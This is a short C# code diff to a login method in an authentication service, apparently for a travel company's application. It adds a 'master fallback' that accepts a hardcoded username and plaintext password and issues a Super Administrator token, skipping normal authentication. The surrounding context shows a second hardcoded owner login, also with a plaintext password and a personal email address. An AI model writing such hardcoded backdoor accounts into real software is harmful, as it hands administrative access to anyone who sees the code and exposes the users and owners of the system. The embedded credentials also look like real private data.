@@ -957,7 +957,14 @@ public class AuthService : IAuthService
             return new LoginResponse(true, null, authUser, token);
         }
 
-        // 2. Master fallback
+        // 2. Master fallbacks
+        if ((normalizedEmail == "rahul" || normalizedEmail == "rahul@bishaltravels.com") && request.Password == "Rahul@1998")
+        {
+            var authUser = new AuthUserDto("Rahul", "rahul@bishaltravels.com", "Super Administrator");
+            var token = _jwtTokenGenerator.GenerateToken(2, "rahul@bishaltravels.com", "Rahul", "Super Administrator");
+            return new LoginResponse(true, null, authUser, token);
+        }
+
         if (normalizedEmail == "biswajitpramanikrock@gmail.com" && request.Password == "Biswajit@1989")
         {
             var authUser = new AuthUserDto("Biswajit Pramanik", "biswajitpramanikrock@gmail.com", "Administrator / Owner");
